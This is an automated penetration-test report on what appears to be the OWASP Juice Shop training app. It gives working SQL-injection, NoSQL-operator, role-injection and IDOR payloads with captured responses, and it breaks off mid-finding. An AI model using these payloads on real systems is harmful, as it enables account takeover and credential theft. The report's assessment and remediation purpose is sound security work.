# Technical Security Assessment: [REDACTED_HOST]

## Executive Summary
Assessment completed for [REDACTED_HOST]. Discovered 0 open ports and 0 service fingerprints. Validated findings: 39. White-box source candidates: 0. CVE references: 0.

## Scope
- Run ID: `501a6113-98ce-4887-bd1b-9386fdc71a5f`
- Mode: `pentest`
- Target: `[REDACTED_HOST]`
- Objective:

## Attack Surface
- Open TCP ports: none observed
- Services: none observed
- CVE references observed: none observed

## Findings Summary
- Critical: 3
- High: 18
- Medium: 18
- Low: 0
- Informational: 0

## Technical Findings
### 1. SQL injection authentication bypass: POST /rest/user/login
- Severity: CRITICAL
- Status: validated
- Confidence: 0.93
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; single canary mutation where required; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Authentication accepted a SQL tautology payload and returned an authenticated-looking response.

**Proof Of Concept**
POST http://[REDACTED_HOST]/rest/user/login with JSON email/username payload `' OR 1=1--` and any password.

**Evidence**
`POST http://[REDACTED_HOST]/rest/user/login` with a SQL tautology returned HTTP 200 and authentication markers.

**Remediation**
Use parameterized queries or ORM-safe predicates for authentication and add negative tests for SQL metacharacters.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/user/login
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 799
ETag: W/"31f-UjIbqBHHj+1+ToM2J7gm5b0END4"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:47 GMT
Connection: close

Request JSON:
{
  "email": "' OR 1=1--",
  "username": "' OR 1=1--",
  "password": "anything"
}

Body Snippet:
{"authentication":{"token":"[REDACTED_TOKEN]","bid":1,"umail":"admin@juice-sh.op"}}
```

### 2. Admin role injection during registration
- Severity: CRITICAL
- Status: validated
- Confidence: 0.92
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; single canary mutation where required
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Registration accepted a client-supplied admin role value.

**Proof Of Concept**
POST registration payload including `"role":"admin"` and observe successful privileged account creation.

**Evidence**
`POST http://[REDACTED_HOST]/api/Users` reflected/admin-confirmed elevated role assignment.

**Remediation**
Ignore client-supplied role fields and assign default least-privilege roles server-side only.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/api/Users
Status: 201
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Location: /api/Users/24
Content-Type: application/json; charset=utf-8
Content-Length: 335
ETag: W/"14f-YRuLFdMAHpSje6Myr95gBCKpOvU"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:49 GMT
Connection: close

Request JSON:
{
  "email": "sechive-admin-1777860048738@example.invalid",
  "password": "SecHive!12345",
  "passwordRepeat": "SecHive!12345",
  "role": "admin",
  "securityQuestion": {
    "id": 1,
    "question": "Your eldest siblings middle name?",
    "createdAt": "2024-01-01",
    "updatedAt": "2024-01-01"
  },
  "securityAnswer": "test"
}

Body Snippet:
{"status":"success","data":{"username":"","deluxeToken":"","lastLoginIp":"0.0.0.0","profileImage":"/assets/public/images/uploads/defaultAdmin.png","isActive":true,"id":24,"email":"sechive-admin-1777860048738@example.invalid","role":"admin","updatedAt":"2026-05-04T02:00:49.117Z","createdAt":"2026-05-04T02:00:49.117Z","deletedAt":null}}
```

### 3. SQL injection data extraction signal: GET /rest/products/search
- Severity: CRITICAL
- Status: validated
- Confidence: 0.92
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; single canary mutation where required; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: UNION-style input returned user credential/role fields, indicating data-exfiltration-capable SQL injection.

**Proof Of Concept**
GET http://[REDACTED_HOST]/rest/products/search?q=xxx%25%27%29%20AND%20description%20LIKE%20%27%25xxx%25%27%29%20UNION%20SELECT%20id,email,password,role,0,0,0,0,0%20FROM%20Users%20LIMIT%205--

**Evidence**
`GET http://[REDACTED_HOST]/rest/products/search?q=xxx%25%27%29%20AND%20description%20LIKE%20%27%25xxx%25%27%29%20UNION%20SELECT%20id,email,password,role,0,0,0,0,0%20FROM%20Users%20LIMIT%205--` returned user/email/password-hash markers.

**Remediation**
Use strict parameter binding, reject unsafe query fragments, and remove SQL error/data leakage from responses.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/products/search?q=xxx%25%27%29%20AND%20description%20LIKE%20%27%25xxx%25%27%29%20UNION%20SELECT%20id,email,password,role,0,0,0,0,0%20FROM%20Users%20LIMIT%205--
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 888
ETag: W/"378-U3ZDY8kXBF30Iu76cwdYDm/UnaI"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:47 GMT
Connection: close

Body Snippet:
{"status":"success","data":[{"id":1,"name":"admin@juice-sh.op","description":"[REDACTED_SECRET]","price":"admin","deluxePrice":0,"image":0,"createdAt":0,"updatedAt":0,"deletedAt":0},{"id":2,"name":"jim@juice-sh.op","description":"[REDACTED_SECRET]","price":"customer","deluxePrice":0,"image":0,"createdAt":0,"updatedAt":0,"deletedAt":0},{"id":3,"name":"bender@juice-sh.op","description":"[REDACTED_SECRET]","price":"customer","deluxePrice":0,"image":0,"createdAt":0,"updatedAt":0,"deletedAt":0},{"id":4,"name":"bjoern.kimminich@gmail.com","description":"[REDACTED_SECRET]","price":"admin","deluxePrice":0,"image":0,"createdAt":0,"updatedAt":0,"deletedAt":0},{"id":5,"name":"ciso@juice-sh.op","description":"[REDACTED_SECRET]","price":"deluxe","deluxePrice":0,"image":0,"createdAt":0,"updatedAt":0,"deletedAt":0}]}
```

### 4. Authenticated API response exposes password hash field
- Severity: HIGH
- Status: validated
- Confidence: 0.91
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: persistence-adjacent, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; harmless marker payload only; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Profile endpoint returned password hash material to an authenticated client session.

**Proof Of Concept**
Authenticate, request whoami with explicit fields including password, and inspect response JSON.

**Evidence**
`GET http://[REDACTED_HOST]/rest/user/whoami?fields=id,email,role,deluxeToken,password` exposed hash data.

**Remediation**
Never serialize password/passwordHash fields in API responses; enforce strict DTO allowlists.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/user/whoami?fields=id,email,role,deluxeToken,password
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 123
ETag: W/"7b-3TzHqGiShM3/IaPRp7QrukC0ENc"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:48 GMT
Connection: close

Body Snippet:
{"user":{"id":1,"email":"admin@juice-sh.op","role":"admin","deluxeToken":"","password":"[REDACTED_SECRET]"}}
```

### 5. Exposed hardcoded client credentials in static bundle
- Severity: HIGH
- Status: validated
- Confidence: 0.90
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: credential-exposure
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; capture proof material in run artifacts
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Static client bundle exposed plaintext credentials usable against the authentication endpoint.

**Proof Of Concept**
Fetch client JavaScript bundles, extract exposed credentials, then authenticate via `/rest/user/login`.

**Evidence**
`GET http://[REDACTED_HOST]/main.js` disclosed embedded credentials.

**Remediation**
Remove credentials from client-side code, rotate exposed secrets, and enforce build-time secret scanning.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/main.js
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 14 Apr 2026 06:50:11 GMT
ETag: W/"14cdab-19d8ac134b8"
Content-Type: application/javascript; charset=UTF-8
Content-Length: 1363371
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:47 GMT
Connection: close

Body Snippet:
import{a as Am}from"./chunk-24EZLZ4I.js";import{a as Bm,b as Um,c as N0,d as A6,f as jm,g as OS}from"./chunk-T3PSKZ45.js";import{$ as bm,$a as L1,$b as Qt,A as zS,Aa as M6,Ab as wr,B as b1,Ba as Bi,Bb as J,C as mm,Ca as AS,Cb as z6,D as hm,Da as Pn,Db as mt,E as Ii,Ea as W1,Eb as u2,F as pm,Fa as Sm,Fb as Vn,G as X1,Ga as ga,Gb as _a,H as x0,Ha as km,Hb as ke,I as TS,Ia as DS,Ib as ea,J as C1,Ja as T0,Jb as g2,K as _r,Ka as Pt,Kb as Qa,L as A2,La as fi,Lb as e1,M as M0,Ma as zm,Mb as ba,N as fm,Na as Zo,Nb as Sr,O as um,Oa as Tm,Ob as Vm,P as Qo,Pa as w6,Pb as D0,Q as w0,Qa as S6,Qb as I0,R as gm,Ra as xi,Rb as kr,S as vm,Sa as ze,Sb as L0,T as Ga,Ta as y1,Tb as Mi,U as ES,Ua as Ce,Ub as zr,V as s1,Va as ge,Vb as at,W as Y2,Wa as ve,Wb as zt,X as b6,Xa as va,Xb as We,Y as n1,Ya as E0,Yb as Om,Z as _m,Za as k6,Zb as IS,_ as S0,_a as xr,_b as ht,a as ue,aa as k0,ab as K2,ac as f1,b as Nt,ba as Z2,bb as E1,bc as P0,c as Zd,ca as C6,cb as I2,cc as v2,d as It,da as Yo,db as l1,dc as T6,e as Se,ea as Cm,eb as Em,ec as V0,f as K,fa as An,fb as ui,fc as Ze,g as Y,ga as br,gb as Wa,gc as E6,h as W,ha as y6,hb as le,hc as Qe,i as $1,ia as Dn,ib as oe,ic as LS,j as y0,ja as h2,jb as ne,jc as Je,k as yt,ka as $2,kb as pe,kc as Hm,l as m2,la as Xi,lb as X2,lc as PS,m as om,ma as z0,mb as p2,mc as O0,n as p1,na as D2,nb as Dm,nc as Nm,o as Lt,oa as qt,ob as Im,oc as Rm,p as K1,pa as ym,pb as A0,pc as VS,q as ja,qa as Cr,qb as de,qc as nt,r as pa,ra as Li,rb as he,rc as $e,s as cm,sa as In,sb as J2,sc as et,t as sm,ta as xm,tb as Lm,tc as H0,u as Ki,ua as Mm,ub as Mr,uc as Fm,v as fa,va as Ln,vb as Vt,w as En,wa as wm,wb as J1,x as lm,xa as yr,xb as f2,y as dm,ya as ua,yb as Pm,z as qa,za as x6,zb as gt}from"./chunk-4MIYPPGW.js";import{$ as Ut,$b as m,$c as vr,A as Kt,Aa as He,Ab as c,B as $t,Ba as kt,Bb as s,Cb as u,D as j,Da as ae,Db as Gt,Dc as Qd,Ea as E2,Eb as Jt,Ec as Ee,F as Tn,Fb as Zi,Fc as ur,Gb as _e,Gc as Yd,H as j1,Ha as v6,Hb as be,Hc as Z,I as g6,Ib as _1,Ic as ot,J as Ad,Jb as L,K as Dd,Kb as Ai,L as Id,La as tt,Lb as S,M as Ld,Ma as wt,Mb as qd,Mc as k,Na as _6,Nb as v,Ob as Re,Pa as Nd,Pb as me,Qa as l,Qb as Be,Qc as $d,Ra as Rd,Rb as te,Sa as N,Sb as F,Sc as gr,Ta as re,Tb as B,U as Pd,Ua as m1,Uc as T1,V as i1,Va as h1,Vc as Ba,W as q1,Wa as Fd,Wc as $i,X as xt,Xa as v1,Xb as se,Xc as _0,Y as Vd,Ya as it,Yb as _t,Yc as b0,Z as hr,Za as u0,Zb as ie,Zc as Kd,_ as Xt,_a as G1,_b as Dt,_c as C0,a as o1,ac as A,ad as Ua,ba as hi,bc as E,bd as Xd,c as ma,ca as $,cb as D,cc as O1,cd as Jd,da as ye,db as xe,dc as Fa,dd as Di,eb as X,ec as Ni,f as we,fa as ce,fb as g0,fc as Ri,g as d2,ga as Ei,gb as Fe,gc as Fi,gd as a1,h as Sd,ha as h,hb as Bd,hc as Ve,hd as em,i as f6,ia as Od,ib as R,ic as W2,id as kS,j as Hi,jb as pr,jc as Gd,jd as tm,k as kd,kc as Ie,kd as im,l as c1,la as z,lc as St,ld as Ae,ma as T,mc as bt,md as am,n as zd,na as Mt,nc as z1,nd as nm,oa as yi,oc as v0,od as rm,p as kn,pa as st,pb as Ra,pc as b,pd as Wt,q,qa as jt,qb as G,qc as C,r as Ha,rb as Ud,rc as dt,rd as Z1,s as u6,sb as M,sc as Q2,sd as ha,tb as jd,ua as Hd,ub as w,uc as Wd,v as mr,va as ft,vb as fr,w as zn,wb as Ft,x as Na,xa as lt,xb as qe,y as Td,ya as p0,yb as Ge,yc as pi,z as Ed,za as f0,zb as f}from"./chunk-LHKS7QUN.js";import{a as Xe,b as U1,d as wd,e as x,f as Te,h as dr,j as Pe}from"./chunk-TWZW5B45.js";function Xo(t){return typeof Symbol=="function"&&typeof Symbol.iterator=="symbol"?Xo=function(n){return typeof n}:Xo=function(n){return n&&typeof Symbol=="function"&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},Xo(t)}function HS(t,n){if(!(t instanceof n))throw new TypeError("Cannot call a class as a function")}function qm(t,n){for(var e=0;e<n.length;e++){var i=n[e];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}function NS(t,n,e){return n&&qm(t.prototype,n),e&&qm(t,e),t}function RS(t,n,e){return n in t?Object.defineProperty(t,n,{value:e,enumerable:!0,configurable:!0,writable:!0}):t[n]=e,t}function Ot(t){for(var n=1;n<arguments.length;n++){var e=arguments[n]!=null?arguments[n]:{},i=Object.keys(e);typeof Object.getOwnPropertySymbols=="function"&&(i=i.concat(Object.getOwnPropertySymbols(e).filter(function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),i.forEach(function(a){RS(t,a,e[a])})}return t}function j6(t,n){return BS(t)||jS(t,n)||GS()}function q6(t){return FS(t)||US(t)||qS()}function FS(t){if(Array.isArray(t)){for(var n=0,e=new Array(t.length);n<t.length;n++)e[n]=t[n];return e}}function BS(t){if(Array.isArray(t))return t}function US(t){if(Symbol.iterator in Object(t)||Object.prototype.toString.call(t)==="[object Arguments]")return Array.from(t)}function jS(t,n){var e=[],i=!0,a=!1,r=void 0;try{for(var o=t[Symbol.iterator](),d;!(i=(d=o.next()).done)&&(e.push(d.value),!(n&&e.length===n));i=!0);}catch(p){a=!0,r=p}finally{try{!i&&o.return!=null&&o.return()}finally{if(a)throw r}}return e}function qS(){throw new TypeError("Invalid attempt to spread non-iterable instance")}function GS(){throw new TypeError("Invalid attempt to destructure non-iterable instance")}function rk(t){var n=H1.querySelector("script["+t+"]");if(n)return n.getAttribute(t)}function ok(t){return t===""?!0:t==="false"?!1:t==="true"?!0:t}function lk(t){Ma&&(B0?setTimeout(t,0):v9.push(t))}function hk(){for(var t=0;t<$o.length;t++)$o[t][0]($o[t][1]);$o=[],H6=!1}function q0(t,n){$o.push([t,n]),H6||(H6=!0,mk(hk,0))}function pk(t,n){function e(a){Q6(n,a)}function i(a){Jo(n,a)}try{t(e,i)}catch(a){i(a)}}function C9(t){var n=t.owner,e=n._state,i=n._data,a=t[e],r=t.then;if(typeof a=="function"){e=U0;try{i=a(i)}catch(o){Jo(r,o)}}y9(r,i)||(e===U0&&Q6(r,i),e===j0&&Jo(r,i))}function y9(t,n){var e;try{if(t===n)throw new TypeError("A promises callback cannot return that same promise.");if(n&&(typeof n=="function"||Xo(n)==="object")){var i=n.then;if(typeof i=="function")return i.call(n,function(a){e||(e=!0,n===a?x9(t,a):Q6(t,a))},function(a){e||(e=!0,Jo(t,a))
```

### 6. Weak MD5 password hash cracking signal
- Severity: HIGH
- Status: validated
- Confidence: 0.89
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; capture proof material in run artifacts
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Leaked password hash was crackable with a short common-password dictionary.

**Proof Of Concept**
Hash common candidate passwords with MD5 and compare against leaked value.

**Evidence**
Leaked hash matched dictionary candidate `admin123`.

**Remediation**
Use adaptive password hashing (Argon2id/bcrypt/scrypt) with per-user salts and secret pepper controls.

### 7. Deluxe membership workflow bypass signal
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; single canary mutation where required
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Deluxe membership upgrade endpoint accepted a direct request from a regular user without explicit payment proof.

**Proof Of Concept**
Register/login as regular user, then POST an empty JSON body to `/rest/deluxe-membership`.

**Evidence**
`POST http://[REDACTED_HOST]/rest/deluxe-membership` returned upgrade markers for a regular account.

**Remediation**
Enforce server-side payment and entitlement verification before role or membership upgrades.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/deluxe-membership
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 943
ETag: W/"3af-ebagSVoIxEg36yU7Yyo0CyYCGlY"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:49 GMT
Connection: close

Request JSON:
{}

Body Snippet:
{"status":"success","data":{"confirmation":"Congratulations! You are now a deluxe member!","token":"[REDACTED_TOKEN]"}}
```

### 8. IDOR signal: GET /api/Feedbacks/:id
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: persistence-adjacent, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; harmless marker payload only; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Authenticated request returned cross-object data without visible ownership checks.

**Proof Of Concept**
GET http://[REDACTED_HOST]/api/Feedbacks/1 with a non-owner bearer token.

**Evidence**
`GET http://[REDACTED_HOST]/api/Feedbacks/1` returned HTTP 200 with object data markers.

**Remediation**
Enforce object-level authorization on every user-scoped resource read and write path.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/api/Feedbacks/1
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 229
ETag: W/"e5-0hqhDQcjMeVsrHfk87RrmsFgRjs"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:48 GMT
Connection: close

Body Snippet:
{"status":"success","data":{"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)","rating":5,"createdAt":"2026-05-04T01:32:37.642Z","updatedAt":"2026-05-04T01:32:37.642Z"}}
```

### 9. IDOR signal: GET /api/Users/:id
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; capture proof material in run artifacts
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Authenticated request returned cross-object data without visible ownership checks.

**Proof Of Concept**
GET http://[REDACTED_HOST]/api/Users/2 with a non-owner bearer token.

**Evidence**
`GET http://[REDACTED_HOST]/api/Users/2` returned HTTP 200 with object data markers.

**Remediation**
Enforce object-level authorization on every user-scoped resource read and write path.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/api/Users/2
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 297
ETag: W/"129-/O2g/Esnxeih1xCTXcTO6J+WRR0"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:48 GMT
Connection: close

Body Snippet:
{"status":"success","data":{"id":2,"username":"","email":"jim@juice-sh.op","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-05-04T01:32:37.367Z","updatedAt":"2026-05-04T01:32:37.367Z","deletedAt":null}}
```

### 10. IDOR signal: GET /rest/basket/:id
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; capture proof material in run artifacts
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Authenticated request returned cross-object data without visible ownership checks.

**Proof Of Concept**
GET http://[REDACTED_HOST]/rest/basket/1 with a non-owner bearer token.

**Evidence**
`GET http://[REDACTED_HOST]/rest/basket/1` returned HTTP 200 with object data markers.

**Remediation**
Enforce object-level authorization on every user-scoped resource read and write path.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/basket/1
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 1310
ETag: W/"51e-86GimSO/vOd62iGlsa+WU2g9iuY"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:48 GMT
Connection: close

Body Snippet:
{"status":"success","data":{"id":1,"coupon":null,"UserId":1,"createdAt":"2026-05-04T01:32:42.714Z","updatedAt":"2026-05-04T01:32:42.714Z","Products":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2026-05-04T01:32:42.384Z","updatedAt":"2026-05-04T01:32:42.384Z","deletedAt":null,"BasketItem":{"ProductId":1,"BasketId":1,"id":1,"quantity":2,"createdAt":"2026-05-04T01:32:42.830Z","updatedAt":"2026-05-04T01:32:42.830Z"}},{"id":2,"name":"Orange Juice (1000ml)","description":"Made from oranges hand-picked by Uncle Dittmeyer.","price":2.99,"deluxePrice":2.49,"image":"orange_juice.jpg","createdAt":"2026-05-04T01:32:42.384Z","updatedAt":"2026-05-04T01:32:42.384Z","deletedAt":null,"BasketItem":{"ProductId":2,"BasketId":1,"id":2,"quantity":3,"createdAt":"2026-05-04T01:32:42.830Z","updatedAt":"2026-05-04T01:32:42.830Z"}},{"id":3,"name":"Eggfruit Juice (500ml)","description":"Now with even more exotic flavour.","price":8.99,"deluxePrice":8.99,"image":"eggfruit_juice.jpg","createdAt":"2026-05-04T01:32:42.384Z","updatedAt":"2026-05-04T01:32:42.384Z","deletedAt":null,"BasketItem":{"ProductId":3,"BasketId":1,"id":3,"quantity":1,"createdAt":"2026-05-04T01:32:42.830Z","updatedAt":"2026-05-04T01:32:42.830Z"}}]}}
```

### 11. NoSQL operator injection signal: PATCH /rest/products/reviews
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, persistence-adjacent
- Attempted: yes
- Impact Bound: max 50 request(s) per vector; 15s request timeout; single canary mutation where required; harmless marker payload only
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Object-operator input in review update was accepted, indicating missing operator sanitization.

**Proof Of Concept**
PATCH review endpoint using object/operator input in id selector.

**Evidence**
`PATCH http://[REDACTED_HOST]/rest/products/reviews` accepted `$ne` operator-style payload.

**Remediation**
Enforce strict schema validation for scalar fields and block operator objects in update selectors.

**Artifact Review**
- evidence: [REDACTED_PATH]

```text
URL: http://[REDACTED_HOST]/rest/products/reviews
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 8524
ETag: W/"214c-UAJ2xoxk7DIkuylosKM75o1rDj8"
Vary: Accept-Encoding
Date: Mon, 04 May 2026 02:00:48 GMT
Connection: close

Request JSON:
{
  "id": {
    "$ne": -1
  },
  "message": "sechive validation marker"
}

Body Snippet:
{"modified":28,"original":[{"message":"Will put one on the Planet Express ship's bumper!","author":"bender@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"6Xct8Ysa9gFGqC84e"},{"message":"🧊 Let it go, let it go 🎶 Can't hold it back anymore 🎶 Let it go, let it go 🎶 Turn away and slam the door ❄️","author":"mc.safesearch@juice-sh.op","product":41,"likesCount":0,"likedBy":[],"_id":"7gKo7H6m7bBaxXtD6"},{"message":"Ooooh, puny human playing Mau Mau, now?","author":"bender@juice-sh.op","product":39,"likesCount":0,"likedBy":[],"_id":"9w2B2pj7PQ2gwMZbt"},{"message":"Looks so much better on my uniform than the boring Starfleet symbol.","author":"jim@juice-sh.op","product":20,"likesCount":0,"likedBy":[],"_id":"LKkdXBpmAmd8E2bcn"},{"message":"Rad, dude!","author":"mc.safesearch@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"LbH5LqyKrDQgXT9KK"},{"message":"Looks spacy on Bones' new tricorder!","author":"jim@juice-sh.op","product":37,"likesCount":0,"likedBy":[],"_id":"ZicHDkZZcKwJAshyp"},{"message":"Even more interesting than watching Interdimensional Cable!","author":"morty@juice-sh.op","product":32,"likesCount":0,"likedBy":[],"_id":"axSrNrfnaJTaA5kn4"},{"message":"Wait for a 10$ Steam sale of Tabletop Simulator!","author":"bjoern@owasp.org","product":35,"likesCount":0,"likedBy":[],"_id":"c3Ch4tWWCcP3skrdh"},{"message":"Just when my opinion of humans couldn't get any lower, along comes Stan...","author":"bender@juice-sh.op","product":42,"likesCount":0,"likedBy":[],"_id":"cHRpCDK4cF7j6j9ie"},{"message":"Fry liked it too.","author":"bender@juice-sh.op","product":6,"likesCount":0,"likedBy":[],"_id":"ckaEKLCBDCYzrTzKu"},{"message":"DO NOT PLAY WITH THIS! Double-sleeve, then put it in the GitHub Arctic Vault for perfect preservation and boost of secondary market value!","author":"accountant@juice-sh.op","product":43,"likesCount":0,"likedBy":[],"_id":"gWkhiMSKAitdM4KjZ"},{"message":"I bought it, would buy again. 5/7","author":"admin@juice-sh.op","product":3,"likesCount":0,"likedBy":[],"_id":"giyv5rfMRh7XphCWH"},{"message":"One of my favorites!","author":"admin@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"ia7tBAEHQbz45d4eq"},{"message":"This is *THE* chance to \"meet the makers\" of both Juice Shop and DSOMM in the United States!","author":"bjoern@owasp.org","product":46,"likesCount":0,"likedBy":[],"_id":"k4imsdtCMeMRpeqLN"},{"message":"K33p5 y0ur ju1cy 5plu773r 70 y0ur53lf!","author":"uvogin@juice-sh.op","product":38,"likesCount":0,"likedBy":[],"_id":"k9jndh2KdnQqNmw6Z"},{"message":"I straight-up gots nuff props fo'these tattoos!","author":"mc.safesearch@juice-sh.op","product":17,"likesCount":0,"likedBy":[],"_id":"mmiGcBnsRKr2LG8zq"},{"message":"I'll be there! Will you, too?","author":"bjoern@owasp.org","product":44,"likesCount":0,"likedBy":[],"_id":"nfhQ3pxRHHsCvhwcx"},{"message":"Fresh out of a replicator.","author":"jim@juice-sh.op","product":22,"likesCount":0,"likedBy":[],"_id":"pqLtrntmnrAgwHtY5"},{"message":"Here yo' learn how tha fuck ta not show yo' goddamn phone on camera!","author":"mc.safesearch@juice-sh.op","product":36,"likesCount":0,"likedBy":[],"_id":"pzXbCtewWfexMRh3j"},{"message":"0 st4rs f0r 7h3 h0rr1bl3 s3cur17y","author":"uvogin@juice-sh.op","product":30,"likesCount":0,"likedBy":[],"_id":"qim8RPxaQeZtdjDPq"},{"message":"Mau Mau with bling-bling? Humans are so pathetic!","author":"bender@juice-sh.op","product":40,"likesCount":0,"likedBy":[],"_id":"rJNrAQvcHvQEG5caG"},{"message":"We will showcase the amazing MultiJuicer Lego Tower at this event!","author":"J12934@juice-sh.op","product":46,"likesCount":0,"likedBy":[],"_id":"rfqa6CFBohnaB4kvq"},{"message":"Check out the /#/photo-wall for some impressions of the assembly process!","author":"bjoern@owasp.org","product":45,"likesCount":0,"likedBy":[],"_id":"tmhqSQHWrM3HPR2dL"},{"message":"This thang would look phat on Bobby's jacked fur coat!","author":"mc.safesearch@juice-sh.op","product":20,"likesCount":0,"likedBy":[],"_id":"ts2LtW84ecdmqK3uw"},{"message":"y0ur f1r3wall needs m0r3 